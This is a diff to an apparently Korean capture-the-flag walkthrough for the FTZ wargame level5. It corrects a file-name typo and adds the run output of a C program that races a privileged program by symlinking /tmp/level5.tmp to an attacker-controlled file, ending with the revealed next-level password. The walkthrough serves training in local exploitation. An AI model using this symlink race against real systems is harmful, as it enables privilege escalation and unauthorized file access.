@@ -16,7 +16,6 @@ level5.tmp 라는 이름의 임시파일을 생성한다.
 ```
 [level5@ftz tmp]$ cat RunTarget.c
 #include <unistd.h>
-
 int main(void)
 {
         int i;
@@ -29,12 +28,12 @@ int main(void)
 ```
 
 ```
-[level5@ftz tmp]$ cat AttactTarget.c
+[level5@ftz tmp]$ cat AttackTarget.c
 #include <unistd.h>
 int main()
 {
         int i;
-        system("touch /tmp/18pass.txt");
+        system("touch /tmp/5pass.txt");
         for(i=0; i<=10; i++)
         {
                 system("ln -s /tmp/5pass.txt /tmp/level5.tmp");
@@ -42,7 +41,7 @@ int main()
         system("cat /tmp/5pass.txt");
         system("rm -rf /tmp/5pass.txt");
 }
-[level5@ftz tmp]$ gcc -o AttackTarget AttactTarget.c
+[level5@ftz tmp]$ gcc -o AttackTarget AttackTarget.c
 ```
 
 ```
@@ -52,6 +51,20 @@ int main()
 ./RunTarget &
 ./AttackTarget
 [level5@ftz tmp]$ chmod 755 AttackTarget.sh
+[level5@ftz tmp]$ ./AttackTarget.sh
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+ln: `/tmp/level5.tmp': 파일이 존재합니다
+next password : what the hell
 ```
+
 
 
